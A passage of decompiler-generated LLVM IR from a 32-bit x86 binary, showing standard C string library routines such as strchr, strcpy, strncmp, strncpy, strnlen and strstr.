  %v4_805dae9 = inttoptr i32 %v3_805dae9 to i16*
  store i16 %v2_805dae9, i16* %v4_805dae9, align 2
  %v5_805dae9 = load i32, i32* %edi.global-to-local, align 4
  %v6_805dae9 = load i32, i32* %esi.global-to-local, align 4
  %v7_805dae9 = load i1, i1* @df, align 1
  %v8_805dae9 = select i1 %v7_805dae9, i32 -2, i32 2
  %v9_805dae9 = add i32 %v8_805dae9, %v5_805dae9
  %v10_805dae9 = add i32 %v8_805dae9, %v6_805dae9
  store i32 %v9_805dae9, i32* %edi.global-to-local, align 4
  store i32 %v10_805dae9, i32* %esi.global-to-local, align 4
  %v0_805daeb.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805daeb

dec_label_pc_805daeb:                             ; preds = %entry, %dec_label_pc_805dae9
  %v0_805daeb = phi i32 [ %v0_805dae5, %entry ], [ %v0_805daeb.pre, %dec_label_pc_805dae9 ]
  %v2_805daeb = urem i32 %v0_805daeb, 2
  %v3_805daeb = icmp eq i32 %v2_805daeb, 0
  br i1 %v3_805daeb, label %dec_label_pc_805daf0, label %dec_label_pc_805daef

dec_label_pc_805daef:                             ; preds = %dec_label_pc_805daeb
  %v0_805daef = load i32, i32* %esi.global-to-local, align 4
  %v1_805daef = inttoptr i32 %v0_805daef to i8*
  %v2_805daef = load i8, i8* %v1_805daef, align 1
  %v3_805daef = load i32, i32* %edi.global-to-local, align 4
  %v4_805daef = inttoptr i32 %v3_805daef to i8*
  store i8 %v2_805daef, i8* %v4_805daef, align 1
  %v5_805daef = load i32, i32* %edi.global-to-local, align 4
  %v6_805daef = load i32, i32* %esi.global-to-local, align 4
  %v7_805daef = load i1, i1* @df, align 1
  %v8_805daef = select i1 %v7_805daef, i32 -1, i32 1
  %v9_805daef = add i32 %v8_805daef, %v5_805daef
  %v10_805daef = add i32 %v8_805daef, %v6_805daef
  store i32 %v9_805daef, i32* %edi.global-to-local, align 4
  store i32 %v10_805daef, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805daf0

dec_label_pc_805daf0:                             ; preds = %dec_label_pc_805daeb, %dec_label_pc_805daef
  store i32 %v4_805dada, i32* %eax.global-to-local, align 4
  %v2_805daf4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805daf4, i32* @esi, align 4
  ret i32 %v4_805dada

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder label %dec_label_pc_805daf0, { 1, 0 }
  uselistorder label %dec_label_pc_805daeb, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_805daf8 = load i32, i32* @edi, align 4
  %v4_805db01 = ptrtoint i8* %arg1 to i32
  %v5_805db05 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  %v6_805db05 = ptrtoint i8* %v5_805db05 to i32
  store i32 %v6_805db05, i32* @ecx, align 4
  store i32 %v0_805daf8, i32* @edi, align 4
  ret i32 %v4_805db01

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @__GI_strchr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_805db11 = ptrtoint i8* %arg1 to i32
  %v2_805db19 = mul i32 %arg2, 256
  %v3_805db19 = and i32 %v2_805db19, 65280
  %v4_805db19 = and i32 %arg2, -65281
  %v5_805db19 = or i32 %v3_805db19, %v4_805db19
  %v8_805db1b.pre = load i1, i1* @df, align 1
  %v9_805db1b = select i1 %v8_805db1b.pre, i32 -1, i32 1
  br label %dec_label_pc_805db1b

dec_label_pc_805db1b:                             ; preds = %dec_label_pc_805db20, %entry
  %v4_805db1b = phi i32 [ %v6_805db1b, %dec_label_pc_805db20 ], [ %v5_805db19, %entry ]
  %v7_805db1b = phi i32 [ %v10_805db1b, %dec_label_pc_805db20 ], [ %v4_805db11, %entry ]
  %v1_805db1b = inttoptr i32 %v7_805db1b to i8*
  %v2_805db1b = load i8, i8* %v1_805db1b, align 1
  %v10_805db1b = add i32 %v7_805db1b, %v9_805db1b
  %v3_805db1c = udiv i32 %v4_805db1b, 256
  %v4_805db1c = trunc i32 %v3_805db1c to i8
  %v16_805db1c = icmp eq i8 %v2_805db1b, %v4_805db1c
  br i1 %v16_805db1c, label %dec_label_pc_805db29, label %dec_label_pc_805db20

dec_label_pc_805db20:                             ; preds = %dec_label_pc_805db1b
  %v3_805db1b = zext i8 %v2_805db1b to i32
  %v5_805db1b = and i32 %v4_805db1b, -256
  %v6_805db1b = or i32 %v3_805db1b, %v5_805db1b
  %v4_805db20 = icmp eq i8 %v2_805db1b, 0
  %v1_805db22 = icmp eq i1 %v4_805db20, false
  br i1 %v1_805db22, label %dec_label_pc_805db1b, label %dec_label_pc_805db24

dec_label_pc_805db24:                             ; preds = %dec_label_pc_805db20
  br label %dec_label_pc_805db29

dec_label_pc_805db29:                             ; preds = %dec_label_pc_805db1b, %dec_label_pc_805db24
  %v0_805db29 = phi i32 [ 1, %dec_label_pc_805db24 ], [ %v10_805db1b, %dec_label_pc_805db1b ]
  %v1_805db2b = add i32 %v0_805db29, -1
  ret i32 %v1_805db2b

; uselistorder directives
  uselistorder i8 %v2_805db1b, { 1, 2, 0 }
  uselistorder i32 %v4_805db1b, { 1, 0 }
  uselistorder i32 -65281, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_805db29, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805db31 = load i32, i32* @esi, align 4
  store i32 %v0_805db31, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_805db39 = ptrtoint i8* %arg1 to i32
  store i32 %v4_805db39, i32* %edi.global-to-local, align 4
  %v4_805db3d.pre = load i32, i32* @eax, align 4
  %v8_805db3d.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_805db3d

dec_label_pc_805db3d:                             ; preds = %dec_label_pc_805db3d.dec_label_pc_805db3d_crit_edge, %entry
  %v2_805db3e = phi i32 [ %v7_805db3e, %dec_label_pc_805db3d.dec_label_pc_805db3d_crit_edge ], [ %v4_805db39, %entry ]
  %v8_805db3d = phi i1 [ %v5_805db3e, %dec_label_pc_805db3d.dec_label_pc_805db3d_crit_edge ], [ %v8_805db3d.pre, %entry ]
  %v4_805db3d = phi i32 [ %v0_805db3f, %dec_label_pc_805db3d.dec_label_pc_805db3d_crit_edge ], [ %v4_805db3d.pre, %entry ]
  %v7_805db3d = phi i32 [ %v0_805db3d.pre, %dec_label_pc_805db3d.dec_label_pc_805db3d_crit_edge ], [ %arg2, %entry ]
  %v1_805db3d = inttoptr i32 %v7_805db3d to i8*
  %v2_805db3d = load i8, i8* %v1_805db3d, align 1
  %v3_805db3d = zext i8 %v2_805db3d to i32
  %v5_805db3d = and i32 %v4_805db3d, -256
  %v6_805db3d = or i32 %v3_805db3d, %v5_805db3d
  store i32 %v6_805db3d, i32* %eax.global-to-local, align 4
  %v9_805db3d = select i1 %v8_805db3d, i32 -1, i32 1
  %v10_805db3d = add i32 %v7_805db3d, %v9_805db3d
  store i32 %v10_805db3d, i32* %esi.global-to-local, align 4
  %v3_805db3e = inttoptr i32 %v2_805db3e to i8*
  store i8 %v2_805db3d, i8* %v3_805db3e, align 1
  %v4_805db3e = load i32, i32* %edi.global-to-local, align 4
  %v5_805db3e = load i1, i1* @df, align 1
  %v6_805db3e = select i1 %v5_805db3e, i32 -1, i32 1
  %v7_805db3e = add i32 %v6_805db3e, %v4_805db3e
  store i32 %v7_805db3e, i32* %edi.global-to-local, align 4
  %v0_805db3f = load i32, i32* %eax.global-to-local, align 4
  %v3_805db3f = trunc i32 %v0_805db3f to i8
  %v4_805db3f = icmp eq i8 %v3_805db3f, 0
  %v1_805db41 = icmp eq i1 %v4_805db3f, false
  br i1 %v1_805db41, label %dec_label_pc_805db3d.dec_label_pc_805db3d_crit_edge, label %dec_label_pc_805db43

dec_label_pc_805db3d.dec_label_pc_805db3d_crit_edge: ; preds = %dec_label_pc_805db3d
  %v0_805db3d.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805db3d

dec_label_pc_805db43:                             ; preds = %dec_label_pc_805db3d
  store i32 %v4_805db39, i32* %eax.global-to-local, align 4
  %v2_805db47 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805db47, i32* @edx, align 4
  %v2_805db48 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805db48, i32* @esi, align 4
  ret i32 %v4_805db39

; uselistorder directives
  uselistorder i32 %v0_805db3f, { 1, 0 }
  uselistorder i32 %v7_805db3e, { 1, 0 }
  uselistorder i1 %v5_805db3e, { 1, 0 }
  uselistorder i32 %v4_805db39, { 1, 2, 0, 3 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @__GI_strncmp(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_805db62 = ptrtoint i8* %arg1 to i32
  %v1_805db6e = add i32 %arg3, 1
  br label %dec_label_pc_805db6f

dec_label_pc_805db6f:                             ; preds = %dec_label_pc_805db76, %entry
  %v20_805db73 = phi i32 [ %v23_805db73, %dec_label_pc_805db76 ], [ %arg2, %entry ]
  %v7_805db72 = phi i32 [ %v10_805db72, %dec_label_pc_805db76 ], [ %v4_805db62, %entry ]
  %v0_805db6f = phi i32 [ %v1_805db6f, %dec_label_pc_805db76 ], [ %v1_805db6e, %entry ]
  %v1_805db6f = add i32 %v0_805db6f, -1
  %v8_805db6f = icmp eq i32 %v1_805db6f, 0
  store i32 %v1_805db6f, i32* @ecx, align 4
  br i1 %v8_805db6f, label %dec_label_pc_805db82, label %dec_label_pc_805db72

dec_label_pc_805db72:                             ; preds = %dec_label_pc_805db6f
  %v1_805db72 = inttoptr i32 %v7_805db72 to i8*
  %v2_805db72 = load i8, i8* %v1_805db72, align 1
  %v3_805db72 = zext i8 %v2_805db72 to i32
  %v4_805db72 = load i32, i32* @eax, align 4
  %v5_805db72 = and i32 %v4_805db72, -256
  %v6_805db72 = or i32 %v5_805db72, %v3_805db72
  store i32 %v6_805db72, i32* @eax, align 4
  %v8_805db72 = load i1, i1* @df, align 1
  %v9_805db72 = select i1 %v8_805db72, i32 -1, i32 1
  %v3_805db73 = inttoptr i32 %v20_805db73 to i8*
  %v4_805db73 = load i8, i8* %v3_805db73, align 1
  %v15_805db73 = icmp eq i8 %v2_805db72, %v4_805db73
  %v1_805db74 = icmp eq i1 %v15_805db73, false
  br i1 %v1_805db74, label %dec_label_pc_805db7e, label %dec_label_pc_805db76

dec_label_pc_805db76:                             ; preds = %dec_label_pc_805db72
  %v23_805db73 = add i32 %v9_805db72, %v20_805db73
  %v10_805db72 = add i32 %v9_805db72, %v7_805db72
  %v4_805db76 = icmp eq i8 %v2_805db72, 0
  %v1_805db78 = icmp eq i1 %v4_805db76, false
  br i1 %v1_805db78, label %dec_label_pc_805db6f, label %dec_label_pc_805db82

dec_label_pc_805db7e:                             ; preds = %dec_label_pc_805db72
  br label %dec_label_pc_805db82

dec_label_pc_805db82:                             ; preds = %dec_label_pc_805db6f, %dec_label_pc_805db76, %dec_label_pc_805db7e
  %storemerge = phi i32 [ 1, %dec_label_pc_805db7e ], [ 0, %dec_label_pc_805db76 ], [ 0, %dec_label_pc_805db6f ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v9_805db72, { 1, 0 }
  uselistorder i8 %v2_805db72, { 1, 0, 2 }
  uselistorder i32 %v1_805db6f, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805db82, { 2, 1, 0 }
}

define i32 @strncpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805db89 = load i32, i32* @esi, align 4
  store i32 %v0_805db89, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_805db95 = ptrtoint i8* %arg1 to i32
  store i32 %v4_805db95, i32* %edi.global-to-local, align 4
  %v1_805db99 = add i32 %arg3, 1
  br label %dec_label_pc_805db9a

dec_label_pc_805db9a:                             ; preds = %dec_label_pc_805db9d, %entry
  %v3_805db9e = phi i32 [ %v4_805db95, %entry ], [ %v8_805db9e, %dec_label_pc_805db9d ]
  %v0_805db9a = phi i32 [ %v1_805db99, %entry ], [ %v0_805db9a.pre, %dec_label_pc_805db9d ]
  %v1_805db9a = add i32 %v0_805db9a, -1
  %v8_805db9a = icmp eq i32 %v1_805db9a, 0
  store i32 %v1_805db9a, i32* @ecx, align 4
  br i1 %v8_805db9a, label %.loopexit, label %dec_label_pc_805db9d

dec_label_pc_805db9d:                             ; preds = %dec_label_pc_805db9a
  %v0_805db9d = load i32, i32* %esi.global-to-local, align 4
  %v1_805db9d = inttoptr i32 %v0_805db9d to i8*
  %v2_805db9d = load i8, i8* %v1_805db9d, align 1
  %v10_805db9d = load i1, i1* @df, align 1
  %v11_805db9d = select i1 %v10_805db9d, i32 -1, i32 1
  %v12_805db9d = add i32 %v11_805db9d, %v0_805db9d
  store i32 %v12_805db9d, i32* %esi.global-to-local, align 4
  %v4_805db9e = inttoptr i32 %v3_805db9e to i8*
  store i8 %v2_805db9d, i8* %v4_805db9e, align 1
  %v5_805db9e = load i32, i32* %edi.global-to-local, align 4
  %v6_805db9e = load i1, i1* @df, align 1
  %v7_805db9e = select i1 %v6_805db9e, i32 -1, i32 1
  %v8_805db9e = add i32 %v7_805db9e, %v5_805db9e
  store i32 %v8_805db9e, i32* %edi.global-to-local, align 4
  %v6_805db9f = icmp eq i8 %v2_805db9d, 0
  %v1_805dba1 = icmp eq i1 %v6_805db9f, false
  %v0_805db9a.pre = load i32, i32* @ecx, align 4
  br i1 %v1_805dba1, label %dec_label_pc_805db9a, label %dec_label_pc_805dba3

dec_label_pc_805dba3:                             ; preds = %dec_label_pc_805db9d
  %v1_805dba3 = add i32 %v0_805db9a.pre, -1
  %v2_805dba4 = sext i8 %v2_805db9d to i32
  %v4_805dba4 = inttoptr i32 %v8_805db9e to i8*
  %v5_805dba4 = call i8* @_memset(i8* %v4_805dba4, i32 %v2_805dba4, i32 %v1_805dba3)
  %v6_805dba4 = ptrtoint i8* %v5_805dba4 to i32
  store i32 %v6_805dba4, i32* @ecx, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_805db9a, %dec_label_pc_805dba3
  %v2_805dbaa = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805dbaa, i32* @edx, align 4
  %v2_805dbab = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805dbab, i32* @esi, align 4
  ret i32 %v4_805db95

; uselistorder directives
  uselistorder i32 %v8_805db9e, { 0, 2, 1 }
  uselistorder i8 %v2_805db9d, { 0, 2, 1 }
  uselistorder i32 %v1_805db9a, { 1, 0 }
  uselistorder i32 %v4_805db95, { 1, 0, 2 }
  uselistorder label %.loopexit, { 1, 0 }
}

define i32 @strnlen() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8* @__decompiler_undefined_function_3()
  %v4_805dbb0 = ptrtoint i8* %tmp4 to i32
  %v8_805dbc38 = icmp eq i32 %tmp, 0
  %v1_805dbc410 = icmp eq i1 %v8_805dbc38, false
  br i1 %v1_805dbc410, label %dec_label_pc_805dbbd, label %dec_label_pc_805dbc6

dec_label_pc_805dbbd:                             ; preds = %entry, %dec_label_pc_805dbc2
  %v1_805dbc312 = phi i32 [ %v1_805dbc3, %dec_label_pc_805dbc2 ], [ %tmp, %entry ]
  %v0_805dbc611 = phi i32 [ %v1_805dbc2, %dec_label_pc_805dbc2 ], [ %v4_805dbb0, %entry ]
  %v1_805dbbd = inttoptr i32 %v0_805dbc611 to i8*
  %v2_805dbbd = load i8, i8* %v1_805dbbd, align 1
  %v3_805dbbd = icmp eq i8 %v2_805dbbd, 0
  br i1 %v3_805dbbd, label %dec_label_pc_805dbc6, label %dec_label_pc_805dbc2

dec_label_pc_805dbc2:                             ; preds = %dec_label_pc_805dbbd
  %v1_805dbc2 = add i32 %v0_805dbc611, 1
  %v1_805dbc3 = add i32 %v1_805dbc312, -1
  %v8_805dbc3 = icmp eq i32 %v1_805dbc3, 0
  %v1_805dbc4 = icmp eq i1 %v8_805dbc3, false
  br i1 %v1_805dbc4, label %dec_label_pc_805dbbd, label %dec_label_pc_805dbc6

dec_label_pc_805dbc6:                             ; preds = %dec_label_pc_805dbc2, %dec_label_pc_805dbbd, %entry
  %v0_805dbc6.lcssa = phi i32 [ %v4_805dbb0, %entry ], [ %v0_805dbc611, %dec_label_pc_805dbbd ], [ %v1_805dbc2, %dec_label_pc_805dbc2 ]
  %v2_805dbc6 = sub i32 %v0_805dbc6.lcssa, %v4_805dbb0
  ret i32 %v2_805dbc6

; uselistorder directives
  uselistorder i32 %v1_805dbc3, { 1, 0 }
  uselistorder i32 %v0_805dbc611, { 0, 2, 1 }
  uselistorder i32 %v4_805dbb0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805dbbd, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %v0_805dbcf = load i32, i32* @ebx, align 4
  %v4_805dbd3 = ptrtoint i8* %arg2 to i32
  %v2_805dbdb = load i8, i8* %arg2, align 1
  %v1_805dbde = icmp eq i8 %v2_805dbdb, 0
  br i1 %v1_805dbde, label %dec_label_pc_805dc92, label %dec_label_pc_805dbe9

dec_label_pc_805dbe9:                             ; preds = %entry
  %v1_805dbe9 = add i32 %arg1, -1
  br label %dec_label_pc_805dbea

dec_label_pc_805dbea:                             ; preds = %dec_label_pc_805dbf6, %dec_label_pc_805dbe9
  %v0_805dbea = phi i32 [ %v1_805dbea, %dec_label_pc_805dbf6 ], [ %v1_805dbe9, %dec_label_pc_805dbe9 ]
  %v1_805dbea = add i32 %v0_805dbea, 1
  %v1_805dbeb = inttoptr i32 %v1_805dbea to i8*
  %v2_805dbeb = load i8, i8* %v1_805dbeb, align 1
  %v1_805dbee = icmp eq i8 %v2_805dbeb, 0
  br i1 %v1_805dbee, label %dec_label_pc_805dc90, label %dec_label_pc_805dbf6

dec_label_pc_805dbf6:                             ; preds = %dec_label_pc_805dbea
  %v14_805dbf6 = icmp eq i8 %v2_805dbeb, %v2_805dbdb
  %v1_805dbf9 = icmp eq i1 %v14_805dbf6, false
  br i1 %v1_805dbf9, label %dec_label_pc_805dbea, label %dec_label_pc_805dbfb

dec_label_pc_805dbfb:                             ; preds = %dec_label_pc_805dbf6
  %v1_805dbfb = add i32 %v4_805dbd3, 1
  %v2_805dc02 = inttoptr i32 %v1_805dbfb to i8*
  %v3_805dc02 = load i8, i8* %v2_805dc02, align 1
  %v1_805dc06 = icmp eq i8 %v3_805dc02, 0
  br i1 %v1_805dc06, label %dec_label_pc_805dc92, label %dec_label_pc_805dc0e

dec_label_pc_805dc0e:                             ; preds = %dec_label_pc_805dbfb
  %v1_805dc0e = add i32 %v0_805dbea, 2
  %v2_805dc0e = inttoptr i32 %v1_805dc0e to i8*
  %v3_805dc0e = load i8, i8* %v2_805dc0e, align 1
  store i32 %v1_805dc0e, i32* @ecx, align 4
  %v1_805dc58 = add i32 %v4_805dbd3, 2
  %v2_805dc58 = inttoptr i32 %v1_805dc58 to i8*
  br label %dec_label_pc_805dc44

dec_label_pc_805dc19:                             ; preds = %dec_label_pc_805dc88
  %v2_805dc19 = inttoptr i32 %v0_805dc4a to i8*
  %v3_805dc19 = load i8, i8* %v2_805dc19, align 1
  store i32 %v0_805dc4a, i32* @ecx, align 4
  br label %dec_label_pc_805dc37.preheader

dec_label_pc_805dc37.preheader:                   ; preds = %dec_label_pc_805dc19, %dec_label_pc_805dc44
  %v0_805dc22.ph.in = phi i8 [ %v4_805dc0e.sink.in, %dec_label_pc_805dc44 ], [ %v3_805dc19, %dec_label_pc_805dc19 ]
  %v14_805dc3745 = icmp eq i8 %v0_805dc22.ph.in, %v2_805dbdb
  %v1_805dc3a47 = icmp eq i1 %v14_805dc3745, false
  br i1 %v1_805dc3a47, label %dec_label_pc_805dc22, label %dec_label_pc_805dc3c

dec_label_pc_805dc22:                             ; preds = %dec_label_pc_805dc37.preheader, %dec_label_pc_805dc33
  %v0_805dc2249.in = phi i8 [ %v2_805dc34, %dec_label_pc_805dc33 ], [ %v0_805dc22.ph.in, %dec_label_pc_805dc37.preheader ]
  %v0_805dc2648 = phi i32 [ %v1_805dc33, %dec_label_pc_805dc33 ], [ %v0_805dc4a, %dec_label_pc_805dc37.preheader ]
  %v1_805dc22 = icmp eq i8 %v0_805dc2249.in, 0
  br i1 %v1_805dc22, label %dec_label_pc_805dc90, label %dec_label_pc_805dc26

dec_label_pc_805dc26:                             ; preds = %dec_label_pc_805dc22
  %v1_805dc26 = add i32 %v0_805dc2648, 1
  store i32 %v1_805dc26, i32* @ecx, align 4
  %v1_805dc27 = inttoptr i32 %v1_805dc26 to i8*
  %v2_805dc27 = load i8, i8* %v1_805dc27, align 1
  %v14_805dc2a = icmp eq i8 %v2_805dc27, %v2_805dbdb
  br i1 %v14_805dc2a, label %dec_label_pc_805dc3c, label %dec_label_pc_805dc2f

dec_label_pc_805dc2f:                             ; preds = %dec_label_pc_805dc26
  %v1_805dc2f = icmp eq i8 %v2_805dc27, 0
  br i1 %v1_805dc2f, label %dec_label_pc_805dc90, label %dec_label_pc_805dc33

dec_label_pc_805dc33:                             ; preds = %dec_label_pc_805dc2f
  %v1_805dc33 = add i32 %v0_805dc2648, 2
  store i32 %v1_805dc33, i32* @ecx, align 4
  %v1_805dc34 = inttoptr i32 %v1_805dc33 to i8*
  %v2_805dc34 = load i8, i8* %v1_805dc34, align 1
  %v14_805dc37 = icmp eq i8 %v2_805dc34, %v2_805dbdb
  %v1_805dc3a = icmp eq i1 %v14_805dc37, false
  br i1 %v1_805dc3a, label %dec_label_pc_805dc22, label %dec_label_pc_805dc3c

dec_label_pc_805dc3c:                             ; preds = %dec_label_pc_805dc33, %dec_label_pc_805dc26, %dec_label_pc_805dc37.preheader
  %v0_805dc3c = phi i32 [ %v0_805dc4a, %dec_label_pc_805dc37.preheader ], [ %v1_805dc26, %dec_label_pc_805dc26 ], [ %v1_805dc33, %dec_label_pc_805dc33 ]
  %v1_805dc3c = add i32 %v0_805dc3c, 1
  store i32 %v1_805dc3c, i32* @ecx, align 4
  %v1_805dc3d = inttoptr i32 %v1_805dc3c to i8*
  %v2_805dc3d = load i8, i8* %v1_805dc3d, align 1
  br label %dec_label_pc_805dc44

dec_label_pc_805dc44:                             ; preds = %dec_label_pc_805dc0e, %dec_label_pc_805dc3c
  %v0_805dc4a = phi i32 [ %v1_805dc0e, %dec_label_pc_805dc0e ], [ %v1_805dc3c, %dec_label_pc_805dc3c ]
  %v4_805dc0e.sink.in = phi i8 [ %v3_805dc0e, %dec_label_pc_805dc0e ], [ %v2_805dc3d, %dec_label_pc_805dc3c ]
  %storemerge4 = icmp eq i8 %v4_805dc0e.sink.in, %v3_805dc02
  %v1_805dc44 = icmp eq i1 %storemerge4, false
  br i1 %v1_805dc44, label %dec_label_pc_805dc37.preheader, label %dec_label_pc_805dc46

dec_label_pc_805dc46:                             ; preds = %dec_label_pc_805dc44
  %v1_805dc4a = add i32 %v0_805dc4a, 1
  %v1_805dc51 = add i32 %v0_805dc4a, -1
  %v2_805dc54 = inttoptr i32 %v1_805dc4a to i8*
  %v3_805dc54 = load i8, i8* %v2_805dc54, align 1
  %v4_805dc54 = zext i8 %v3_805dc54 to i32
  %v3_805dc58 = load i8, i8* %v2_805dc58, align 1
  %v4_805dc58 = zext i8 %v3_805dc58 to i32
  %v12_805dc5d = icmp eq i8 %v3_805dc54, %v3_805dc58
  %v1_805dc5f = icmp eq i1 %v12_805dc5d, false
  br i1 %v1_805dc5f, label %dec_label_pc_805dc88, label %dec_label_pc_805dc61

dec_label_pc_805dc61:                             ; preds = %dec_label_pc_805dc46, %dec_label_pc_805dc75
  %v0_805dc78 = phi i32 [ %v1_805dc78, %dec_label_pc_805dc75 ], [ %v1_805dc58, %dec_label_pc_805dc46 ]
  %v0_805dc75 = phi i32 [ %v1_805dc75, %dec_label_pc_805dc75 ], [ %v1_805dc4a, %dec_label_pc_805dc46 ]
  %v0_805dc61 = phi i32 [ %v3_805dc7b, %dec_label_pc_805dc75 ], [ %v4_805dc54, %dec_label_pc_805dc46 ]
  %v1_805dc61 = icmp eq i32 %v0_805dc61, 0
  br i1 %v1_805dc61, label %dec_label_pc_805dc92, label %dec_label_pc_805dc65

dec_label_pc_805dc65:                             ; preds = %dec_label_pc_805dc61
  %v1_805dc65 = add i32 %v0_805dc75, 1
  %v2_805dc65 = inttoptr i32 %v1_805dc65 to i8*
  %v3_805dc65 = load i8, i8* %v2_805dc65, align 1
  %v1_805dc69 = add i32 %v0_805dc78, 1
  %v2_805dc69 = inttoptr i32 %v1_805dc69 to i8*
  %v3_805dc69 = load i8, i8* %v2_805dc69, align 1
  %v4_805dc69 = zext i8 %v3_805dc69 to i32
  %v12_805dc6d = icmp eq i8 %v3_805dc65, %v3_805dc69
  %v1_805dc6f = icmp eq i1 %v12_805dc6d, false
  br i1 %v1_805dc6f, label %dec_label_pc_805dc88, label %dec_label_pc_805dc71

dec_label_pc_805dc71:                             ; preds = %dec_label_pc_805dc65
  %v1_805dc71 = icmp eq i8 %v3_805dc69, 0
  br i1 %v1_805dc71, label %dec_label_pc_805dc92, label %dec_label_pc_805dc75

dec_label_pc_805dc75:                             ; preds = %dec_label_pc_805dc71
  %v1_805dc75 = add i32 %v0_805dc75, 2
  %v1_805dc78 = add i32 %v0_805dc78, 2
  %v1_805dc7b = inttoptr i32 %v1_805dc78 to i8*
  %v2_805dc7b = load i8, i8* %v1_805dc7b, align 1
  %v3_805dc7b = zext i8 %v2_805dc7b to i32
  %v1_805dc7f = inttoptr i32 %v1_805dc75 to i8*
  %v2_805dc7f = load i8, i8* %v1_805dc7f, align 1
  %v12_805dc82 = icmp eq i8 %v2_805dc7f, %v2_805dc7b
  br i1 %v12_805dc82, label %dec_label_pc_805dc61, label %dec_label_pc_805dc86

dec_label_pc_805dc86:                             ; preds = %dec_label_pc_805dc75
  br label %dec_label_pc_805dc88

dec_label_pc_805dc88:                             ; preds = %dec_label_pc_805dc65, %dec_label_pc_805dc46, %dec_label_pc_805dc86
  %v0_805dc88 = phi i32 [ %v4_805dc58, %dec_label_pc_805dc46 ], [ %v3_805dc7b, %dec_label_pc_805dc86 ], [ %v4_805dc69, %dec_label_pc_805dc65 ]
  %v1_805dc88 = icmp eq i32 %v0_805dc88, 0
  %v1_805dc8a = icmp eq i1 %v1_805dc88, false
  br i1 %v1_805dc8a, label %dec_label_pc_805dc19, label %dec_label_pc_805dc92

dec_label_pc_805dc90:                             ; preds = %dec_label_pc_805dbea, %dec_label_pc_805dc2f, %dec_label_pc_805dc22
  br label %dec_label_pc_805dc92

dec_label_pc_805dc92:                             ; preds = %dec_label_pc_805dc88, %dec_label_pc_805dc61, %dec_label_pc_805dc71, %entry, %dec_label_pc_805dbfb, %dec_label_pc_805dc90
  %storemerge2 = phi i32 [ 0, %dec_label_pc_805dc90 ], [ %v1_805dbea, %dec_label_pc_805dbfb ], [ %arg1, %entry ], [ %v1_805dc51, %dec_label_pc_805dc71 ], [ %v1_805dc51, %dec_label_pc_805dc61 ], [ %v1_805dc51, %dec_label_pc_805dc88 ]
  store i32 %v0_805dbcf, i32* @ebx, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i32 %v1_805dc78, { 1, 0 }
  uselistorder i32 %v1_805dc75, { 1, 0 }
  uselistorder i8 %v3_805dc69, { 1, 0, 2 }
  uselistorder i8 %v4_805dc0e.sink.in, { 1, 0 }
  uselistorder i32 %v0_805dc4a, { 5, 4, 2, 3, 1, 0 }
  uselistorder i8 %v2_805dc34, { 1, 0 }
  uselistorder i32 %v1_805dc33, { 0, 2, 3, 1 }
  uselistorder i8 %v2_805dc27, { 1, 0 }
  uselistorder i32 %v0_805dc2648, { 1, 0 }
  uselistorder i32 %v1_805dbea, { 0, 2, 1 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_805dc92, { 5, 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_805dc90, { 1, 2, 0 }
  uselistorder label %dec_label_pc_805dc88, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805dc61, { 1, 0 }
  uselistorder label %dec_label_pc_805dc44, { 1, 0 }
  uselistorder label %dec_label_pc_805dc22, { 1, 0 }
  uselistorder label %dec_label_pc_805dc37.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_805dc9c = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v3_805dcad = call i32 @__xpg_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3)
  %v0_805dcb5 = load i32, i32* @ebx, align 4
  store i32 %v0_805dc9c, i32* @ebx, align 4
  ret i32 %v0_805dcb5
}

define i32 @__xpg_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
